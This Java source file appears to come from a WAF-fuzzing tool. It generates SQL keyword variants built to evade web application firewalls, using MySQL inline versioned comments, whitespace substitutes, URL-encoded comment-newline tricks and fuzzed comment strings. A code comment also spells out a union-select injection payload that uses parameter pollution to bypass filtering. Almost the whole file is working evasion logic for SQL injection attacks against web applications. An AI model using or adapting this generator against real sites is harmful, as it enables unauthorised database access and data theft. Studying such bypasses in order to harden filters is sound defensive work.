package com.sqldd.fuzzingWaf.utils;

import com.sqldd.utils.MakeNum;
import com.sqldd.utils.MakeStr;

import java.util.ArrayList;

public class DoubleCharBypass {
    //bypass方法二-两个字符组合的情况
    public ArrayList<String> doubleCharacterBypass(String keyword1,String keyword2){
        ArrayList<String> orderBys = new ArrayList<>();
        //fuzz内联1 ：在内联注释符中间fuzz字符串进行绕过
        //以下五行这种方式先取得所有组合，时间消耗较大。待改良
        ArrayList<String> fuzzLists = fuzz();
        for (String fuzzStr : fuzzLists) {
            orderBys.add("/*!"+keyword1+"/*" + fuzzStr + "*/"+keyword2+"*/");//length<=8（只有/*!%构造更多）
            orderBys.add("/*!"+keyword1+"/*" + fuzzStr + "*/*/"+keyword2+"");
        }
        //fuzz内联2 ：/**！5位数字但大于版本号数字 注释内容 */。即在关键字之间加内联注释干扰
        MakeNum makeNum = new MakeNum();
        MakeStr makeStr = new MakeStr();
        String numPlusStrRandom = makeNum.tools_getRandomNumber(8, 6, 5) +" "+ makeStr.tools_getStrsRandom(5);
        orderBys.add(keyword1+"/*!" + numPlusStrRandom + "*/"+keyword2);
        //get传参绕过，在原有的get参数基础上添加其他参数，格式：参数名1=/**&原有参数&参数名2=*/。由于数据库后台没有接收a,b值，是无效参数，所以会通过
        //?id=4/*&id=-1' union select 1,user(),3--+&b=8*/因为需要技巧拼接注释符，所以应该只能适用get方式【第一个id可以为其他任意不存在变量名】
        //且这种方式和我程序架构不太适应。前缀成了4/*&id=-1'，后缀成了--+&b=8*/
        //orderBys.add("4/*&id=-1' order by 1--+&b=8*/");
        orderBys.add(keyword1+"("+keyword2+")");

        //空格占位符绕过，比如0a/0b/a0之类
        GetStr getStr = new GetStr();
        ArrayList<String> blankReplaces = getStr.getBlankReplace();
        for (String blankReplace : blankReplaces) {
            orderBys.add(keyword1+blankReplace+keyword2);
        }
        //%23%0a绕过
        orderBys.add(keyword1+"%23%0A"+keyword2);
        //内联注释绕过
        orderBys.add(keyword1+"/*!14400*/"+keyword2);
        orderBys.add("/*!23144"+keyword1+"*//*!24432"+keyword2+"*/");


        return orderBys;
    }

    //工具方法fuzz,参数选择
    public ArrayList<String> fuzz(){
        MakeStr makeStr = new MakeStr();
        char[] chars = {'/','*','!','%'};
        ArrayList<String> fuzzLists = makeStr.tools_getStrsByMaxLength(chars, 5);
        return fuzzLists;
    }

    public static void main(String[] args) {
        DoubleCharBypass bypass = new DoubleCharBypass();
        ArrayList<String> list = bypass.doubleCharacterBypass(".", ".");
        for (String s : list) {
            System.out.println(s);
        }
    }
}
